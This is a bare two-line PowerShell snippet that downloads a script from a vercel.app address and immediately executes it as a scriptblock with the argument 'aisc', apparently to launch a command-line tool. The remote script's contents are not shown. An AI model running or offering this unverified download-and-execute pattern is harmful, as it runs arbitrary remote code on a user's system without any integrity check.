$s = Invoke-RestMethod "https://cli-ashen-two.vercel.app/list.ps1"
& ([scriptblock]::Create($s)) aisc
